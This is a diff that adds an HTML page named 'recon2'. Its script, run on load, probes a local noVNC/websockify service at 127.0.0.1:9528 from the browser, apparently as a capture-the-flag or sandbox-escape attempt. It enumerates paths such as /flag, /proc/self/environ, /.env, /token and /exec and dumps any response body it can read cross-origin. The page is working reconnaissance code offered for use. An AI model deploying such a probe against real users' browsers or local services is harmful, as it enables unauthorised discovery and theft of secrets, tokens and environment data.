@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>recon2</title>
+<style>
+  body{font-family:monospace;background:#0b0b0b;color:#ddd;padding:16px;font-size:13px;}
+  h2{color:#6cf}
+  .ok{color:#3f6} .err{color:#c66} .info{color:#fc6}
+  pre{white-space:pre-wrap;word-break:break-all;background:#151515;padding:8px;border-left:3px solid #444;max-height:400px;overflow:auto}
+  #out div{padding:1px 0}
+</style>
+</head>
+<body>
+<h2>9528 route enumeration + CORS/mixed-content test</h2>
+<div id="out"></div>
+<h2>Fetched bodies</h2>
+<div id="body"></div>
+<script>
+const out=document.querySelector('#out'), bodyEl=document.querySelector('#body');
+function log(cls,msg){const d=document.createElement('div');d.className=cls;d.textContent=msg;out.appendChild(d);}
+function dump(title,txt){const h=document.createElement('div');h.className='ok';h.textContent='### '+title;bodyEl.appendChild(h);const p=document.createElement('pre');p.textContent=txt.slice(0,4000);bodyEl.appendChild(p);}
+
+// 尝试真正读取 body(需要对方允许 CORS,否则 catch)
+async function readBody(url){
+  try{
+    const r=await fetch(url,{cache:'no-store'});   // 默认 cors 模式
+    const txt=await r.text();
+    log('ok',`READ OK [${r.status}] ${url}  (len=${txt.length})`);
+    dump(url,txt);
+    return txt;
+  }catch(e){
+    log('err',`READ FAIL ${url}  -> ${e.name}: ${e.message}`);
+    return null;
+  }
+}
+
+// no-cors 只判断存活,不读 body
+async function alive(url){
+  try{ await fetch(url,{mode:'no-cors',cache:'no-store'}); log('info',`(reachable) ${url}`); return true;}
+  catch(e){ return false;}
+}
+
+const base='http://127.0.0.1:9528';
+const paths=['/','/index.html','/vnc.html','/vnc_lite.html','/app/','/package.json',
+  '/api','/api/','/flag','/env','/environ','/proc/self/environ','/info','/status',
+  '/health','/version','/debug','/config','/websockify','/sandbox','/exec','/cmd',
+  '/token','/vnc','/screenshot','/download','/file','/.env','/robots.txt'];
+
+(async()=>{
+  log('info','--- step1: can we even READ 9528 body cross-origin? ---');
+  await readBody(base+'/');           // noVNC 首页
+  await readBody(base+'/vnc.html');
+  await readBody(base+'/package.json');// 泄漏版本/依赖
+
+  log('info','--- step2: enumerate routes (read body if CORS allows) ---');
+  for(const p of paths){ await readBody(base+p); }
+
+  log('info','--- done ---');
+})();
+</script>
+</body>
+</html>
